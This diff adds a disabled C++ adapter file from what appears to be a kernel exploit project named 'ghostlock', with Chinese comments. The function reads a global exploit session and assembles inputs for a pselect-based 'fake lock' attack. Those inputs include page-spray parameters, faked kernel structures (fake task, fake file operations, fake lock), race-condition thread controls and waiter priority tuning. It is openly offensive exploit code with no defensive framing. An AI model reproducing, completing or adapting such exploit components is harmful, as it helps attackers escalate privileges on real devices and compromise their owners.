@@ -1,0 +1,72 @@
+/**
+ * @file route_select_session.cpp.disabled
+ * @brief 已停用：select 的会话适配器（逻辑迁 Kotlin）。
+ * @note 恢复：mv route_select_session.cpp.disabled route_select_session.cpp。
+ */
+#include "route.h"
+#include "route_select.h"
+#include "session.h"
+#include "support.h"
+#include "profile.h"
+#include "memory.h"
+#include "params.h"
+#include "log.h"
+
+using namespace ghostlock;
+
+namespace ghostlock::route {
+    /**
+     * @brief 会话适配器：唯一读取 `g_exploit_session` 的位置（Kotlin 传参落地后删除）。
+     */
+    route::RouteStatus do_pselect_route_from_session(const memory::WriteRequest *request) {
+        auto &s = session::g_exploit_session;
+        const profile::SelectStackLayout layout = s.profile.select_stack_layout();
+        core::PageSprayInputs spray =
+            support::page_spray_inputs_from_session(request ? *request : memory::WriteRequest{});
+        core::SelectInputs in{
+            .page = {
+                .base = (s.heap.current.base),
+                .last_mm_struct = (s.heap.current.last_mm_struct),
+                .fake_lock = (s.heap.current.fake_lock),
+                .fake_w0 = (s.heap.current.fake_w0),
+                .fake_task = (s.heap.current.fake_task),
+                .fake_parent = (s.heap.current.fake_parent),
+                .fake_right = (s.heap.current.fake_right),
+                .fake_left = (s.heap.current.fake_left),
+                .fake_fops = (s.heap.current.fake_fops),
+            },
+            .race = {
+                .consumer_calls = &s.race.consumer_calls,
+                .consumer_success = &s.race.consumer_success,
+                .consumer_stop = &s.race.consumer_stop,
+                .consumer_go = &s.race.consumer_go,
+                .consumer_inflight = &s.race.consumer_inflight,
+                .waiter_tid = &s.race.waiter_tid,
+                .route_delay_usec = &s.race.route_delay_usec,
+            },
+            .request = request ? *request : memory::WriteRequest{},
+            .waiter_shift = s.profile.loaded()
+                                ? layout.waiter_shift.value_or(0)
+                                : kernel::PSELECT_WAITER_WORD_SHIFT,
+            .compact_waiter = layout.compact_waiter.value_or(0) ? 1 : 0,
+            .timeout_us = s.profile.select_timeout_us(),
+            .enter_delay_us = s.profile.select_enter_delay_us(),
+            .waiter_prio = kernel::FAKE_WAITER_PRIO,
+            .nfds = PSELECT_ROUTE_NFDS,
+            .stdio_backup = route::standard_io_backup_snapshot(),
+            .spray = &spray,
+            /* TODO(P3-kotlin-params)：以下投影值在 Kotlin 传参落地后由 profile 提供。 */
+            .attempts_compact = 4,
+            .attempts_plain = 1,
+            .disarm_spin = 2000,
+            .disarm_poll_us = 1000,
+            .delay_ladder = core::kSelectDelayLadderUs.data(),
+            .delay_ladder_len = static_cast<std::uint32_t>(core::kSelectDelayLadderUs.size()),
+            .waiter_wake_prio_low_bits = 3,
+            .waiter_tree_prio = 1,
+            .waiter_pi_prio = 1,
+            .waiter_wake_state = 3,
+        };
+        return do_pselect_fake_lock_route(in);
+    }
+} // namespace ghostlock::route
